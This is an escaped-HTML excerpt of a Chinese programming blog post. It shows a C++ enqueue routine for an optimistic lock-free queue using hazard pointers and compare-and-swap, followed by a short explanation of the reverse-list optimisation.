&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;C++&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
bool enqueue( value_type&amp;amp; val )
{
  node_type * pNew = node_traits::to_node_ptr( val );
  typename gc::template GuardArray&amp;lt;2&amp;gt; guards;
  back_off bkoff;
  guards.assign( 1, &amp;amp;val );
  node_type * pTail = guards.protect( 0, m_pTail, node_to_value());
  while( true ) {
    // 从尾至头形成一个直接列表
     pNew-&amp;gt;m_pNext.store( pTail, std::memory_order_release );
     // Trying to change the tail
     if ( m_pTail.compare_exchange_strong( pTail, pNew,
        std::memory_order_release, std::memory_order_relaxed )) 
     {
        /*
          从头到尾形成一个相反的列表
          操作系统可以中断、替换。
          结果，pTail从队列中被替换掉，即出队
          （不用担心，pTail会被Hazard Pointer保护，因此具有不可被移除性）

        */
        pTail-&amp;gt;m_pPrev.store( pNew, std::memory_order_release );
        break ;                             // Enqueue done!
     }
     /*
        CAS没有成功，pTail已被改变，（记住C++11中CAS特点：
        第一个元素传的是引用）
        Hazard Pointer保护新的pTail

        */
     guards.assign( 0, node_traits::to_value_ptr( pTail ));
     // High contention – let’s step back
     bkoff();
  }
  return true;
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e9356589769-36&quot;&gt;36&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;enqueue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;value_type&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-2&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_type&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_traits&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;to_node_ptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;GuardArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;back_off &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bkoff&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;assign&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;&amp;amp;val &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_type&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;protect&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;node_to_value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// 从尾至头形成一个直接列表&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;release&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Trying to change the tail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;compare_exchange_strong&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;relaxed&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-16&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          从头到尾形成一个相反的列表&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-17&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          操作系统可以中断、替换。&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-18&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          结果，pTail从队列中被替换掉，即出队&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-19&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          （不用担心，pTail会被Hazard Pointer保护，因此具有不可被移除性）&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-21&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;        */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pPrev&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;release&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;                             &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Enqueue done!&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-26&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;        CAS没有成功，pTail已被改变，（记住C++11中CAS特点：&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-27&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;        第一个元素传的是引用）&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-28&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;        Hazard Pointer保护新的pTail&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-29&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-30&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;        */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;assign&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_traits&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;to_value_ptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// High contention – let’s step back&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;bkoff&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e9356589769-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e9356589769-36&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0052 seconds] --&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;这段代码证明了我们所做出的优化：建立pPrev列表（对我们最重要了），希望能成功。倘若发现直接列表和反向列表之间有错位，我们不得不花时间确认了（运行fix_list）。&lt;/p&gt;
